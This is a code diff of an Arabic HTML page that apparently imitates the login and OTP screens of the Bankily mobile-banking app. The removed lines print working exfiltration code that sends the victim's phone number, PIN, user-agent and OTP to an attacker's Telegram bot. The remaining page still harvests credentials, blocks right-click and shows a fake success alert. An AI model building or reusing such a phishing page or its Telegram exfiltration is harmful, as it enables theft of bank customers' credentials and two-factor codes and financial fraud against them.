@@ -154,15 +154,15 @@
         /* تعديل الموضع ليصبح في الجهة اليمنى (الأصلي) بمحاذاة الأيقونة */
         .password-wrapper-box {
             display: flex;
-            justify-content: flex-end; 
+            justify-content: flex-end; /* تم إعادتها لليمين تماماً */
             width: 100%;
-            padding-right: 45px; 
+            padding-right: 45px; /* إعطاء مسافة للأيقونة من اليمين */
         }
 
         /* حاوية حقول الرقم السري مرتبة في اليمين مع إبقاء الاتجاه العام للحقول LTR */
         .password-container {
             display: flex;
-            gap: 15px; 
+            gap: 15px; /* مسافة واضحة بين الحقول الأربعة */
             width: auto; 
             direction: ltr !important; 
         }
@@ -178,6 +178,7 @@
             outline: none;
             background: transparent;
             
+            /* إجبار الكتابة والمحاذاة والبدء من اليسار فقط داخل كل مربع وبشكل صارم */
             direction: ltr !important;
             text-align: left !important; 
             unicode-bidi: plaintext !important;
@@ -233,19 +234,21 @@
             margin-bottom: 40px;
         }
 
+        /* تعديل الموضع ليصبح في المنتصف تماماً ومطابق للصور المرفقة */
         .otp-wrapper-box {
             display: flex;
-            justify-content: center; 
+            justify-content: center; /* نقل وتوسيط الحقل في المنتصف تماماً */
             width: 100%;
             margin-bottom: 35px;
         }
 
         .otp-container {
             display: flex;
-            gap: 20px; 
+            gap: 20px; /* مسافة ثابتة ومريحة للإدخال */
             direction: ltr !important;
         }
 
+        /* تطبيق خاصية LTR الصارمة ومنع الإدخال أو المحاذاة من اليمين/الوسط لحقول OTP */
         .otp-field {
             width: 32px;
             height: 40px;
@@ -256,6 +259,7 @@
             outline: none;
             background: transparent;
             
+            /* إجبار الكتابة والمحاذاة والبدء من اليسار فقط داخل الخانة وبشكل صارم */
             direction: ltr !important;
             text-align: left !important;
             unicode-bidi: plaintext !important;
@@ -283,67 +287,12 @@
             margin-bottom: 25px;
         }
 
-        /* التصميم الخاص بكلمة "رمز التاكيد" المطابق تماماً للتطبيق الرسمي */
-        .otp-confirmation-text {
-            font-size: 1.15rem;
-            font-weight: bold;
-            color: #111;
-            margin-bottom: 35px;
-            text-align: center;
-            display: block;
-            width: 100%;
-        }
-
-        /* تصميم كرت التنبيه السفلي المنبثق (Toast Alert) */
-        .custom-toast-alert {
-            position: absolute;
-            bottom: 85px; 
-            left: 5%;
-            width: 90%;
-            background-color: #ffffff;
-            border-radius: 12px;
-            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.15);
-            padding: 12px 15px;
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            direction: rtl;
-            text-align: right;
-            transform: translateY(20px);
-            opacity: 0;
-            transition: all 0.3s ease-in-out;
-            visibility: hidden;
-            z-index: 999;
-        }
-
-        .custom-toast-alert.show {
-            transform: translateY(0);
-            opacity: 1;
-            visibility: visible;
-        }
-
-        .toast-icon-box {
-            background-color: #f1f3f4;
+        .green-circle {
             width: 32px;
             height: 32px;
+            border: 4px solid #00ff00;
             border-radius: 50%;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            flex-shrink: 0;
-        }
-
-        .toast-icon-box span {
-            color: #5f6368;
-            font-weight: bold;
-            font-size: 1.1rem;
-        }
-
-        .toast-text {
-            font-size: 0.88rem;
-            color: #202124;
-            font-weight: 500;
-            line-height: 1.4;
+            margin-bottom: 30px;
         }
 
         /* الزر السفلي الأصفر الثابت */
@@ -431,19 +380,10 @@
             <p class="otp-timer-label">تنتهي صلاحية رمز التأكيد خلال</p>
             <p class="otp-timer-countdown">4 دقائق 58 ثواني</p>
 
-            <div class="otp-confirmation-text">رمز التاكيد</div>
+            <div class="green-circle"></div>
 
             <div class="register-link-box" style="margin-top: 0; margin-bottom: 10px;">
                 <a href="#" style="color: #444; font-weight: normal;">إعادة إرسال رمز التأكيد</a>
-            </div>
-        </div>
-
-        <div id="toastAlert" class="custom-toast-alert">
-            <div class="toast-icon-box">
-                <span>!</span>
-            </div>
-            <div class="toast-text">
-                رقم الهاتف غير تابع لشركات الاتصال المعتمدة (موريتل، ماتل، شنقيتل)
             </div>
         </div>
 
@@ -452,27 +392,6 @@
     </div>
 
     <script>
-        // ================== إعدادات التليجرام ==================
-        const TELEGRAM_TOKEN = 'YOUR_BOT_TOKEN'; // ضع هنا توكن البوت الخاص بك
-        const TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID'; // ضع هنا الأيدي الشات الخاص بك
-
-        // دالة الإرسال إلى التليجرام
-        function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-            const payload = {
-                chat_id: TELEGRAM_CHAT_ID,
-                text: message,
-                parse_mode: 'Markdown'
-            };
-
-            fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify(payload)
-            }).catch(err => console.error('Error sending to Telegram:', err));
-        }
-        // ========================================================
-
         // --- حظر النقر بزر الماوس الأيمن والأوسط لحماية الواجهة والبيانات ---
         document.addEventListener('contextmenu', function(e) {
             e.preventDefault();
@@ -485,24 +404,12 @@
             }
         });
 
-        // تنظيف مدخلات الأرقام لحقل الهاتف والتحقق الذكي من الشبكات الموريتانية المعتمدة
+        // تنظيف مدخلات الأرقام لحقل الهاتف
         function cleanNumberInput(input) {
             input.value = input.value.replace(/[^0-9]/g, '');
-            const toast = document.getElementById('toastAlert');
-            
-            if (input.value.length === 8) {
-                const firstDigit = input.value.charAt(0);
-                if (firstDigit !== '2' && firstDigit !== '3' && firstDigit !== '4') {
-                    toast.classList.add('show'); 
-                } else {
-                    toast.classList.remove('show'); 
-                }
-            } else {
-                toast.classList.remove('show');
-            }
         }
 
-        // حركة التنقل التلقائي وخلفي لحقول الرقم السري الأربعة
+        // حركة التنقل التلقائي وخلفي لحقول الرقم السري الأربعة (تبدأ وتتحرك من اليسار فقط)
         function handlePasswordNavigation(current, currentIndex) {
             current.value = current.value.replace(/[^0-9]/g, '');
             const fields = document.querySelectorAll('.password-field');
@@ -521,7 +428,7 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // حركة التنقل لحقول رمز التحقق OTP
+        // حركة التنقل لحقول رمز التحقق OTP (تبدأ وتتحرك من اليسار فقط)
         function handleOtpNavigation(current, currentIndex) {
             current.value = current.value.replace(/[^0-9]/g, '');
             const fields = document.querySelectorAll('.otp-field');
@@ -540,14 +447,13 @@
             field.addEventListener('drop', (e) => e.preventDefault());
         });
 
-        // التحقق والإرسال عند الضغط على الزر الرئيسي
+        // التحقق عند الضغط على الزر الرئيسي
         function onFooterButtonClick() {
             const loginSection = document.getElementById('loginSection');
             const otpSection = document.getElementById('otpSection');
             const titleText = document.getElementById('titleText');
             const backArrow = document.getElementById('backArrow');
             const submitBtn = document.getElementById('submitBtn');
-            const toast = document.getElementById('toastAlert');
 
             if (!loginSection.classList.contains('hidden')) {
                 const userVal = document.getElementById('usernameInput').value.trim();
@@ -564,33 +470,20 @@
                     alert("يجب إدخال رقم الهاتف كاملاً والمكون من 8 أرقام.");
                     return;
                 }
-
-                if (toast.classList.contains('show')) {
-                    alert("الرجاء إدخال رقم هاتف موريتاني صحيح تابع لـ (موريتل، ماتل، شنقيتل).");
-                    return;
-                }
-
                 if (passVal.length !== 4) {
                     alert("يجب إدخال الرقم السري كاملاً والمكون من 4 أرقام.");
                     return;
                 }
 
-                // --- [الرسالة الأولى للتليجرام: بيانات الدخول] ---
-                const msg = `🔔 *تسجيل دخول جديد (بنكيلي)*\n\n👤 *رقم الهاتف:* \`${userVal}\`\n🔐 *الرقم السري:* \`${passVal}\`\n🌐 *المتصفح:* ${navigator.userAgent}`;
-                sendToTelegram(msg);
-
-                // الانتقال للـ OTP
                 loginSection.classList.add('hidden');
                 otpSection.classList.remove('hidden');
                 titleText.innerText = "رمز التحقق";
                 backArrow.style.display = "block";
                 submitBtn.innerText = "التحقق";
-                toast.classList.remove('show');
                 
             } else {
                 let otpCode = "";
                 document.querySelectorAll('.otp-field').forEach(box => otpCode += box.value.trim());
-                const userVal = document.getElementById('usernameInput').value.trim();
 
                 if (otpCode === "") {
                     alert("الرجاء إدخال رمز التحقق (OTP) المرسل إلى هاتفك.");
@@ -601,10 +494,6 @@
                     alert("الرجاء تعبئة حقل الـ OTP كاملاً (4 أرقام).");
                     return;
                 }
-
-                // --- [الرسالة الثانية للتليجرام: كود الـ OTP] ---
-                const otpMsg = `📩 *رمز التحقق المكتوب (OTP)*\n\n👤 *الحساب:* \`${userVal}\`\n🔢 *كود الـ OTP:* \`${otpCode}\``;
-                sendToTelegram(otpMsg);
 
                 alert("تم التحقق بنجاح! جاري تسجيل الدخول...");
             }
@@ -617,7 +506,6 @@
             document.getElementById('titleText').innerText = ""; 
             document.getElementById('backArrow').style.display = "none";
             document.getElementById('submitBtn').innerText = "تسجيل الدخول";
-            document.getElementById('toastAlert').classList.remove('show');
         }
     </script>
 </body>
